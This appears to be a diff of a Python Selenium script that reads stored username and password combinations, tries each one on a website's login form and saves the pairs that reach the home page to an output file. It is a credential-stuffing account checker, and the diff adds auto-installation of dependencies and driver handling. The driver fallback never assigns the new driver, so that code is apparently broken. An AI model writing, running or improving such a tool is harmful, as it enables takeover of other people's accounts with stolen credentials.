@@ -6,8 +6,27 @@
 # *******************************************************
 
 #? Libraries
+import os
 import time
+
+try:
+    from selenium.common.exceptions import WebDriverException
+    from selenium import webdriver
+except ImportError:
+    print("Installing SELENIUM...")
+    os.system('python -m pip install selenium')
+
+try:
+    from webdriver_manager.chrome import ChromeDriverManager
+except:
+    print("Installing WEB DRIVER MANAGER...")
+    os.system('python -m pip install webdriver-manager')
+
+from selenium.common.exceptions import WebDriverException
 from selenium import webdriver
+from webdriver_manager.chrome import ChromeDriverManager
+
+###############################################################################
 
 #! Webdriver address
 Driver_Address = "chromedriver.exe"
@@ -24,7 +43,6 @@ Next_Button = '//*[@id="layers"]/div/div/div/div/div/div/div[2]/div[2]/div/div/d
 Login_Button = '//*[@id="layers"]/div/div/div/div/div/div/div[2]/div[2]/div/div/div[2]/div[2]/div[2]/div/div/div/div/div'
 
 
-
 #! Basic data
 File_Addres = "final_data.txt" #! File name must be "Final_Addres"
 Username = ""
@@ -34,10 +52,19 @@ Data_Status = 0
 
 while True:
     try:
-        #! Driver option
-        Option = webdriver.ChromeOptions()
-        Driver = webdriver.Chrome(Driver_Address)
-        Driver.get(Site)
+
+        try:
+
+            #! Driver option
+            Option = webdriver.ChromeOptions()
+            Driver = webdriver.Chrome(Driver_Address)
+            Driver.get(Site)
+
+        except WebDriverException:
+
+            #! Update webdriver
+            Driver_Manager = ChromeDriverManager(path=Driver_Address)
+            webdriver.Chrome(ChromeDriverManager().install())
 
         #? Open and read data file
         with open(File_Addres, "r") as File:
@@ -121,33 +148,31 @@ while True:
             print("Can't find login button")
             Driver.close()
 
-        #? If data has 3 parts(username,password,email/phonenumber)
-        if Data_Status == 3:
-            #? Send phonenumber to phone box
-            try:
-                Phone_Box_Founded = Driver.find_element("name", Phonenumber_Box)
-                Phone_Box_Founded.send_keys(Phone)
-                time.sleep(3)
-            except:
-                print("Can't find phonenumber box")
-                Driver.close()
+        #? Send phonenumber to phone box
+        try:
+            Phone_Box_Founded = Driver.find_element("name", Phonenumber_Box)
+            Phone_Box_Founded.send_keys(Phone)
+            time.sleep(3)
+        except:
+            print("Can't find phonenumber box")
+            Driver.close()
 
-            #? Click on next button(Password)
-            try:
-                Login_BTN = Driver.find_element("xpath", Login_Button)
-                Login_BTN.click()
-                time.sleep(3)
-            except:
-                print("Can't find login button")
-                Driver.close()
-        else:
+        #? Click on next button(Password)
+        try:
+            Login_BTN = Driver.find_element("xpath", Login_Button)
+            Login_BTN.click()
+            time.sleep(3)
+        except:
+            print("Can't find login button")
+            Driver.close()
+        
             
-            #! Write currect username & password in output file 
-            if Driver.current_url == Home :
-                with open("Output.txt", "a") as Output:
-                    Output.write(f"{Username}:{Password}")
-                    Output.write("\n")
-                    Driver.quit()
+        #! Write currect username & password in output file 
+        if Driver.current_url == Home :
+            with open("Output.txt", "a") as Output:
+                Output.write(f"{Username}:{Password}")
+                Output.write("\n")
+                Driver.quit()
 
     except Exception:
         print(Exception)          
